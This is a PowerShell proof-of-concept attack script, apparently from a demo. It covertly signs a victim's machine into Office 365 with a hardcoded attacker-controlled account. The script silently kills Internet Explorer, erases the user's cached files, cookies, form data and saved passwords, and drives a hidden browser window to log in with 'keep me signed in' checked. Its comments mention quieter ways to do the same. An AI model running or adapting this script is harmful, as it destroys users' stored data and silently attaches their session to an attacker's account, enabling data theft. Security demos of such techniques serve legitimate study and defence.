#PowerShell IE sign-in for portal.office.com

#Define Username/Password for malicious account
$Username = "badguy@EVILER.onmicrosoft.com" 
#Password can be encrypted and loaded from a separate file, I'm just being lazy during the demo
$Password = "Password1"
$URL = "portal.office.com"

#Silently kill IE if it exists so that we can clear its temp-files via dll in the next step
Get-Process iexplore -EA SilentlyContinue | Stop-Process

# Clear out temporary IE files to avoid hitting SSO issues during portal sign-in

# There are cleaner and less noticeable ways of doing this, such as navigating through different menus (use_another_account, etc), and leaving cookies/temp files intact, but I'm sticking with this for the PoC

#Temp Files
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8
#Cookies
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2
#FormData
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 16
#Passwords
rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 32

# Load up IE
$ie = New-Object -com InternetExplorer.Application
# Set to invisible - If this was set to $True, the user would see IE pop up and load Office365
$ie.visible = $False 

#Load the webpage
$ie.navigate($URL)

#Sleep while it loads...
while($ie.ReadyState -ne 4) {start-sleep -m 100} 

#Enter User/Pass in the forms

$ie.document.getElementById("cred_userid_inputtext").value= "$username" 
$ie.document.getElementById("cred_password_inputtext").value = "$password" 

# Click the extremely important cred_keep_me_signed_in_checkbox
$ie.document.getElementById("cred_keep_me_signed_in_checkbox").Checked = $True

#sleep
while($ie.ReadyState -ne 4) {start-sleep -m 100} 
#Click in both forms to remove filler text
$ie.document.getElementById("cred_userid_inputtext").click();
$ie.document.getElementById("cred_password_inputtext").click();
#Execute Sign-In by clicking "Sign In"
$ie.document.getElementById("cred_sign_in_button").click();

